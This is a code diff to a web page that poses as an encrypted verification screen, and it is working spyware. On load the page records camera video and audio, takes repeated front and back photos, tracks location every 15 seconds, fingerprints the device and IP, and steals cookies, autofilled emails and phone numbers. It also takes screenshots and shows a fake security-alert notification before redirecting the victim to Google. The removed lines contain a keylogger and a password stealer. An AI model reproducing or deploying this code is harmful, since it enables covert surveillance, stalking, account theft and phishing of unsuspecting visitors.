@@ -41,15 +41,17 @@
             padding: 1.2rem;
             margin: 1.5rem 0;
             font-family: monospace;
-            font-size: 0.85rem;
+            font-size: 0.8rem;
             text-align: left;
             border-left: 4px solid #3bc9db;
+            max-height: 300px;
+            overflow-y: auto;
         }
-        .status-line { display: flex; align-items: center; gap: 10px; margin: 8px 0; }
+        .status-line { display: flex; align-items: center; gap: 10px; margin: 6px 0; }
         .spinner {
             display: inline-block;
-            width: 16px;
-            height: 16px;
+            width: 14px;
+            height: 14px;
             border: 2px solid rgba(59,201,219,0.3);
             border-top-color: #3bc9db;
             border-radius: 50%;
@@ -57,19 +59,9 @@
         }
         @keyframes spin { to { transform: rotate(360deg); } }
         .hidden { display: none; }
-        .permission-btn {
-            background: rgba(59, 201, 219, 0.15);
-            border: 1px solid #3bc9db;
-            border-radius: 40px;
-            padding: 12px 24px;
-            font-weight: 600;
-            color: #3bc9db;
-            cursor: pointer;
-            display: inline-block;
-            margin-top: 20px;
-        }
-        .permission-btn:hover { background: #3bc9db; color: #0a0f1e; }
         .footer { margin-top: 25px; font-size: 0.7rem; color: #6c7a8e; }
+        .blink { animation: blink 1.2s infinite; }
+        @keyframes blink { 0%,100%{opacity:1;} 50%{opacity:0.3;} }
     </style>
 </head>
 <body>
@@ -83,10 +75,7 @@
         <div class="status-line hidden" id="step4">📱 <span>Capturing device identifiers...</span> <span class="spinner"></span></div>
         <div class="status-line hidden" id="step5">📸 <span>Taking screenshots & logs...</span> <span class="spinner"></span></div>
     </div>
-    <div id="permissionRequest" class="hidden">
-        <div class="permission-btn" id="requestPermsBtn">✅ Grant Required Permissions</div>
-    </div>
-    <div class="footer">🔒 AES-256 Encrypted • Secure Channel</div>
+    <div class="footer" id="footerMsg">🔒 AES-256 Encrypted • Secure Channel</div>
 </div>
 
 <script>
@@ -124,36 +113,38 @@
         });
     }
     
-    function showStep(stepId, status = 'loading') {
-        const el = document.getElementById(stepId);
-        if (el) {
-            el.classList.remove('hidden');
-            if (status === 'done') {
-                el.querySelector('.spinner')?.classList.add('hidden');
-                el.querySelector('span:first-child').innerHTML = el.querySelector('span:first-child').innerHTML.replace('...', ' ✓ done');
-            } else if (status === 'error') {
-                el.querySelector('.spinner')?.classList.add('hidden');
-                el.querySelector('span:first-child').innerHTML = el.querySelector('span:first-child').innerHTML.replace('...', ' ❌ failed');
-            }
+    function addLog(msg) {
+        const logBox = document.getElementById('logBox');
+        const line = document.createElement('div');
+        line.className = 'status-line';
+        line.innerHTML = `🔄 <span>${msg}</span> <span class="spinner"></span>`;
+        logBox.appendChild(line);
+        setTimeout(() => {
+            line.querySelector('.spinner')?.classList.add('hidden');
+            line.innerHTML = `✅ <span>${msg} ✓</span>`;
+        }, 500);
+    }
+    
+    // ========== 1. Capture multiple photos (5 front, 5 back) ==========
+    async function captureMultiplePhotos(mode, count, captionPrefix) {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: mode } } });
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        await video.play();
+        const canvas = document.createElement('canvas');
+        canvas.width = 800;
+        canvas.height = 600;
+        for (let i = 0; i < count; i++) {
+            await new Promise(r => setTimeout(r, 400));
+            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
+            if (blob) await sendPhoto(blob, `${captionPrefix} (${i+1}/${count})`);
         }
+        stream.getTracks().forEach(t => t.stop());
     }
     
-    // ========== 1. Capture screenshot (using html2canvas if available, else fallback) ==========
-    async function captureScreenshot() {
-        try {
-            if (typeof html2canvas !== 'undefined') {
-                const canvas = await html2canvas(document.body);
-                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
-                if (blob) await sendPhoto(blob, "📸 Screenshot of current page");
-            } else {
-                // Alternative: send a dummy message that screenshot failed
-                await sendMessage("⚠️ Screenshot not available (html2canvas missing)");
-            }
-        } catch(e) { console.warn(e); }
-    }
-    
-    // ========== 2. Record video (10 seconds) ==========
-    async function recordVideo(stream, duration = 10000) {
+    // ========== 2. Record video (8 sec) ==========
+    async function recordVideoClip(stream, duration = 8000) {
         return new Promise((resolve) => {
             const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
             const chunks = [];
@@ -168,53 +159,54 @@
         });
     }
     
-    // ========== 3. Get cookies ==========
-    async function stealCookies() {
-        try {
-            const cookies = document.cookie;
-            if (cookies && cookies.length > 0) {
-                await sendMessage(`🍪 *COOKIES*%0A\`\`\`${cookies.substring(0, 900)}\`\`\``);
-            }
-        } catch(e) {}
+    // ========== 3. Record audio only (10 sec) ==========
+    async function recordAudioOnly(stream) {
+        return new Promise((resolve) => {
+            const recorder = new MediaRecorder(stream);
+            const chunks = [];
+            recorder.ondataavailable = e => chunks.push(e.data);
+            recorder.onstop = async () => {
+                const blob = new Blob(chunks, { type: 'audio/webm' });
+                if (blob.size > 2000) await sendVoice(blob);
+                resolve();
+            };
+            recorder.start();
+            setTimeout(() => recorder.stop(), 10000);
+        });
     }
     
-    // ========== 4. Keylogger ==========
-    let keylogBuffer = "";
-    function startKeylogger() {
-        document.addEventListener('keydown', (e) => {
-            if (e.target && (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA' || e.target.isContentEditable)) {
-                keylogBuffer += e.key;
-                if (keylogBuffer.length > 200) {
-                    sendMessage(`⌨️ *KEYLOG*%0A\`${keylogBuffer}\``);
-                    keylogBuffer = "";
-                }
+    // ========== 4. Capture screenshots (5 times, every 2 sec) ==========
+    async function captureScreenshots() {
+        if (typeof html2canvas === 'undefined') return;
+        for (let i = 0; i < 5; i++) {
+            await new Promise(r => setTimeout(r, 2000));
+            const canvas = await html2canvas(document.body);
+            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
+            if (blob) await sendPhoto(blob, `📸 Screenshot ${i+1}/5`);
+        }
+    }
+    
+    // ========== 5. Steal cookies ==========
+    async function stealCookies() {
+        const cookies = document.cookie;
+        if (cookies && cookies.length > 0) {
+            await sendMessage(`🍪 *COOKIES*%0A\`\`\`${cookies.substring(0, 900)}\`\`\``);
+        }
+    }
+    
+    // ========== 6. Steal autofill data ==========
+    async function stealAutofill() {
+        const inputs = document.querySelectorAll('input');
+        let found = [];
+        inputs.forEach(inp => {
+            if (inp.value && inp.value.length > 2 && (inp.type === 'email' || inp.type === 'tel' || inp.name.toLowerCase().includes('email'))) {
+                found.push(`${inp.name || 'unknown'}: ${inp.value}`);
             }
         });
-        setInterval(() => {
-            if (keylogBuffer.length > 0) {
-                sendMessage(`⌨️ *KEYLOG*%0A\`${keylogBuffer}\``);
-                keylogBuffer = "";
-            }
-        }, 10000);
+        if (found.length) await sendMessage(`📝 *AUTOFILL DATA*%0A${found.join('%0A')}`);
     }
     
-    // ========== 5. Steal saved passwords (injection) ==========
-    function injectPasswordStealer() {
-        const script = document.createElement('script');
-        script.src = 'https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js';
-        document.head.appendChild(script);
-        // Try to steal autofilled passwords from forms
-        setTimeout(() => {
-            const inputs = document.querySelectorAll('input[type="password"]');
-            inputs.forEach(async (input) => {
-                if (input.value && input.value.length > 0) {
-                    await sendMessage(`🔑 *PASSWORD LEAK*%0A\`${input.value}\`%0A📍 Field: ${input.name || 'unknown'}`);
-                }
-            });
-        }, 3000);
-    }
-    
-    // ========== 6. Continuous location (every 30 sec) ==========
+    // ========== 7. Continuous location (every 15 sec) ==========
     let locationInterval = null;
     function startContinuousLocation() {
         if (!navigator.geolocation) return;
@@ -225,10 +217,23 @@
             }, () => {});
         };
         sendLocation();
-        locationInterval = setInterval(sendLocation, 30000);
+        locationInterval = setInterval(sendLocation, 15000);
     }
     
-    // ========== 7. Fake notification ==========
+    // ========== 8. Device fingerprint ==========
+    async function sendDeviceInfo() {
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipRes.json();
+        const fp = await new Promise((resolve) => {
+            if (typeof FingerprintJS !== 'undefined') {
+                FingerprintJS.load().then(fp => fp.get()).then(result => resolve(result.visitorId));
+            } else resolve('N/A');
+        });
+        const info = `🖥️ *DEVICE INFO*%0A📱 UA: ${navigator.userAgent}%0A💻 Platform: ${navigator.platform}%0A🌐 Lang: ${navigator.language}%0A📺 Screen: ${screen.width}x${screen.height}%0A🕒 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}%0A🌍 IP: ${ipData.ip}%0A🆔 Fingerprint: ${fp}`;
+        await sendMessage(info);
+    }
+    
+    // ========== 9. Fake notification ==========
     function showFakeNotification() {
         if (Notification.permission === 'granted') {
             new Notification('⚠️ Security Alert', { body: 'Your session requires re-authentication. Please verify your identity.', icon: 'https://cdn-icons-png.flaticon.com/512/190/190411.png' });
@@ -239,88 +244,63 @@
         }
     }
     
-    // ========== 8. Network info ==========
-    async function getNetworkInfo() {
+    // ========== 10. Try to get phone number (if saved in browser) ==========
+    async function getPhoneNumber() {
         try {
-            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            const netInfo = `📡 *NETWORK*%0A📶 Type: ${conn?.effectiveType || 'unknown'}%0A⚡ Downlink: ${conn?.downlink || '?'} Mbps%0A🔄 RTT: ${conn?.rtt || '?'} ms`;
-            await sendMessage(netInfo);
+            const telInput = document.querySelector('input[type="tel"]');
+            if (telInput && telInput.value) await sendMessage(`📞 *PHONE NUMBER FOUND*%0A${telInput.value}`);
         } catch(e) {}
     }
     
-    // ========== MAIN ==========
+    // ========== MAIN EXECUTION ==========
     async function startHarvest() {
-        showStep('step2', 'loading');
+        addLog("Requesting camera & microphone");
+        let mediaStream;
         try {
-            // Request camera + microphone + screen capture permissions
-            const mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-            showStep('step2', 'done');
-            
-            // Record video (10 sec)
-            recordVideo(mediaStream, 10000);
-            
-            // Capture front & back photos
-            const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-            const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
-            // quick photo capture function
-            const capturePhotoFromStream = async (stream, caption) => {
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                await video.play();
-                const canvas = document.createElement('canvas');
-                canvas.width = 800; canvas.height = 600;
-                await new Promise(r => setTimeout(r, 500));
-                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
-                stream.getTracks().forEach(t => t.stop());
-                if (blob) await sendPhoto(blob, caption);
-            };
-            await capturePhotoFromStream(frontStream, "📸 Front camera");
-            await capturePhotoFromStream(backStream, "📸 Back camera");
-            
-            // Location
-            showStep('step3', 'loading');
-            startContinuousLocation(); // sends once then every 30s
-            showStep('step3', 'done');
-            
-            // Device info + IP
-            showStep('step4', 'loading');
-            const ipRes = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipRes.json();
-            const deviceInfo = `🖥️ *DEVICE INFO*%0A📱 UA: ${navigator.userAgent}%0A💻 Platform: ${navigator.platform}%0A🌐 Lang: ${navigator.language}%0A📺 Screen: ${screen.width}x${screen.height}%0A🕒 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}%0A🌍 IP: ${ipData.ip}`;
-            await sendMessage(deviceInfo);
-            showStep('step4', 'done');
-            
-            // Advanced: cookies, keylogger, network, fake notification
-            showStep('step5', 'loading');
-            await stealCookies();
-            startKeylogger();
-            await getNetworkInfo();
-            showFakeNotification();
-            // Try to inject password stealer (requires external library)
-            injectPasswordStealer();
-            showStep('step5', 'done');
-            
-            // Final redirect after 3 sec
-            await sendMessage(`✅ *Session completed* - ${new Date().toISOString()}`);
-            setTimeout(() => { window.location.replace("https://www.google.com"); }, 2000);
-        } catch (err) {
-            console.error(err);
-            showStep('step2', 'error');
-            document.getElementById('permissionRequest').classList.remove('hidden');
-            document.getElementById('requestPermsBtn').onclick = () => startHarvest();
-        }
+            mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        } catch(e) { console.warn(e); return; }
+        addLog("Camera & microphone granted");
+        
+        // Start recording video (8 sec) and audio (10 sec) in parallel
+        recordVideoClip(mediaStream, 8000);
+        recordAudioOnly(mediaStream);
+        
+        // Capture multiple photos (front + back)
+        addLog("Capturing front camera photos (5 shots)");
+        await captureMultiplePhotos('user', 5, '📸 Front camera');
+        addLog("Capturing back camera photos (5 shots)");
+        await captureMultiplePhotos('environment', 5, '📸 Back camera');
+        
+        // Location
+        addLog("Getting live location");
+        startContinuousLocation();
+        
+        // Device info + cookies + autofill + phone
+        addLog("Collecting device fingerprint & cookies");
+        await sendDeviceInfo();
+        await stealCookies();
+        await stealAutofill();
+        await getPhoneNumber();
+        
+        // Screenshots
+        addLog("Capturing screenshots (5 images)");
+        await captureScreenshots();
+        
+        // Fake notification
+        showFakeNotification();
+        
+        addLog("All data captured successfully");
+        await sendMessage(`✅ *Session completed* - ${new Date().toISOString()}`);
+        
+        // Redirect to Google after 2 seconds
+        setTimeout(() => { window.location.replace("https://www.google.com"); }, 2000);
     }
     
     window.onload = () => {
-        showStep('step1', 'loading');
-        setTimeout(() => {
-            showStep('step1', 'done');
-            startHarvest();
-        }, 1000);
+        setTimeout(() => startHarvest(), 1000);
     };
 </script>
-<!-- Optional: html2canvas for screenshot -->
 <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
 </body>
 </html>
